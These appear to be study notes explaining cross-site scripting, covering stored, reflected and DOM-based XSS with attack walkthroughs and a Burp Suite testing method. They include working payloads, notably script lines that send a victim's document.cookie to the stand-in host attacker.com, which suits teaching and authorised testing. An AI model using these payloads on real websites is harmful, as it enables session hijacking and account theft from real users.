It is a web security flaw that lets attackers inject malicious code into a website, compromising user interactions.

Bypasses Same Origin Policy: XSS evades the security rule that keeps websites isolated, allowing attackers to access or manipulate user sessions.

Masquerades as User: Attackers can impersonate victims, performing actions or stealing data the user can access.

Example: An attacker injects <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script> into a comment field. 
When a user views the comment, their session cookie is sent to the attacker’s server, letting the attacker log in as the user.

High Risk for Privileged Users: If the victim has admin rights, attackers could gain full control over the application’s functionality and data.

-

How does XSS work?

Malicious Code Injection: An attacker injects harmful JavaScript into a website’s input fields (e.g., forms, comments, or URLs) or database, 
which runs in a user’s browser when they load the affected page.

Exploits User Session: The code steals session data (like cookies) or performs actions as the user, bypassing security to access their account or data.

-

XSS proof of concept

Can confirm most kinds of XSS vulnerability by injecting a payload that causes your own browser to execute some arbitrary JavaScript using:
console.log() or alert()

Example PoC: 
Inject 

<script>console.log("XSS PoC Success")</script> 

into a vulnerable input field (e.g., a comment box, search field, or URL parameter) on the target website. 
If the console shows "XSS PoC Success" when the page loads, the XSS is confirmed.

Check console output in the browser's Developer Tools by going to the Console tab, and look for the output: "XSS PoC Success" from console.log()

-

Types of XSS attacks:

1. Stored (Persistent) XSS: The malicious script is permanently saved on the target server (e.g., in a database, comment section, forum post), 
affecting users who access the compromised page.

ex: 

Scenario: A vulnerable forum or blog comment section.

Attack Steps:

1. Attacker Action: An attacker visits a blog's comment section and submits a comment containing malicious JavaScript:
HTML

<script>alert('You have been hacked!');</script>

2. Server Action: The blog application, lacking proper input validation and sanitization, stores this entire comment (including the <script> tags) directly into its database.

3. Victim Action: Any subsequent user who views that blog post will have their browser load the stored comment from the server.

4. Result: When the victim's browser renders the page, it encounters the <script> tag and executes the alert('You have been hacked!'); JavaScript. 
This could easily be replaced with code to steal cookies, redirect users, or deface the page.


1.1 Kind of Reflected XSS payload to be used is based on:

1. The location of the reflected data within the application's response.
2. If the application performs any validation or other processing on the submitted data before it is reflected.


1.2 How to find and test for stored XSS vulnerabilities

A more realistic approach is to work systematically through the data entry points, 
submitting a specific value into each one, and monitoring the application's responses to detect cases where the submitted value appears.
When the submitted value is observed in a response, you need to determine whether the data is indeed being stored 
across different requests, as opposed to being simply reflected in the immediate response.

This involves determining the context within the response where the stored data appears and testing suitable candidate XSS payloads 
that are applicable to that context. 
At this point, the testing methodology is broadly the same as for finding reflected XSS vulnerabilities.


2. Reflected (Non-Persistent) XSS: The malicious script is reflected off the web server in an error message or search result, 
requiring the attacker to trick the victim into clicking a specially crafted link. 
Web server doesn't check the mal input and embeds in the HTTP response that causes the vuln.

ex: 

Scenario: A vulnerable search function on an e-commerce website.

Attack Steps:

1. Vulnerability: The website's search page takes a user's query from the URL and directly embeds it back into the HTML response without proper encoding. 
For example, if you search for shoes, the URL might be https://example.com/search?query=shoes and the page displays "You searched for: shoes".

2. Attacker Action: An attacker crafts a malicious URL like this:

https://example.com/search?query=<script>document.location='http://attacker.com/steal_cookies?c='+document.cookie;</script>

3. Delivery Mechanism: The attacker sends this malicious URL to a victim, perhaps via an email, chat message, or a link on a compromised website.

4. Victim Action: The victim clicks on the link. Their browser sends a request to example.com with the malicious script in the query parameter.

5. Server Action: The example.com server receives the request. 
Because it's vulnerable, it takes the <script> tag from the query parameter and reflects it directly into the HTML response:

<h1>You searched for: <script>document.location='http://attacker.com/steal_cookies?c='+document.cookie;</script></h1>

6. Result: When the victim's browser receives this response, it executes the embedded JavaScript. 
This script redirects the victim to attacker.com while also sending their session cookie (document.cookie), allowing the attacker to potentially hijack their session.


2.1 Kind of Reflected XSS payload to be used is based on:

1. The location of the reflected data within the application's response.
2. If the application performs any validation or other processing on the submitted data before it is reflected.


2.2 How to find and test for reflected XSS vulnerabilities

2.2.1 Test every entry point:
This includes- parameters or other data within the URL query string and message body, and the URL file path and HTTP headers.

2.2.2 Submit random alphanumeric values:
For each entry point, submit a unique random alphanumeric value of around 8 characters and determine whether the value is reflected in the response.
Use Burp Intruder's number payloads with randomly generated hex values to generate suitable random values. 
And you can use Burp Intruder's grep payloads settings to automatically flag responses that contain the submitted value.

2.2.3 Determine the reflection context: 
For each location within the response where the random value is reflected, determine its context. 
This might be in text between HTML tags, within a tag attribute which might be quoted, within a JavaScript string, etc.

2.2.4 Test a candidate payload: 
Based on the context of the reflection, test an initial candidate XSS payload that will trigger JavaScript execution if it is 
reflected unmodified within the response. 
The easiest way to test payloads is to send the request to Burp Repeater, modify the request to insert the candidate payload, 
issue the request, and then review the response to see if the payload worked. 
An efficient way to work is to leave the original random value in the request and place the candidate XSS payload before or after it. 
Then set the random value as the search term in Burp Repeater's response view. 
Burp will highlight each location where the search term appears, letting you quickly locate the reflection.

2.2.5 Test alternative payloads: 
If the candidate XSS payload was modified by the application, or blocked altogether, 
then you will need to test alternative payloads and techniques that might deliver a working XSS attack based on the context 
of the reflection and the type of input validation that is being performed.

2.2.6 Test the attack in a browser: 
Finally, if you succeed in finding a payload that appears to work within Burp Repeater, transfer the attack to a real browser 
and see if the injected JavaScript is indeed executed.


3. DOM-based XSS: The vulnerability lies in the client-side code (JavaScript) that processes data, 
modifying the Document Object Model (DOM) environment in the victim's browser rather than the server response itself.

ex:

Scenario: A web page that uses JavaScript to display a user-supplied message based on the URL's fragment identifier (the part after #).

Attack Steps:

1. Vulnerability: A legitimate page https://example.com/greeting.html has JavaScript like this:

// greeting.html
document.addEventListener('DOMContentLoaded', function() {
    var message = decodeURIComponent(window.location.hash.substring(1)); // Gets content after #
    document.getElementById('displayArea').innerHTML = 'Hello, ' + message + '!';
});

And in its HTML: <div id="displayArea"></div> The vulnerability is in using innerHTML with unsanitized user input from window.location.hash.

2. Attacker Action: An attacker crafts a malicious URL:

https://example.com/greeting.html#<img src=x onerror=alert('DOM_XSS_Attack')>

3. Delivery Mechanism: The attacker sends this link to a victim.

4. Victim Action: The victim clicks on the link. 
Their browser navigates to greeting.html. Crucially, the content after # (<img src=x onerror=alert('DOM_XSS_Attack')>) is not sent to the server.

5. Client-Side Action: Once the page loads in the victim's browser, the JavaScript on greeting.html executes. 
It retrieves the fragment identifier using window.location.hash, decodes it, and then directly inserts it into the innerHTML of the displayArea div.

6. Result: The browser interprets the injected <img> tag. Since src=x is an invalid image source, the onerror event fires, executing alert('DOM_XSS_Attack'). 
The attack happens entirely client-side, without the malicious payload ever interacting with the server.

-














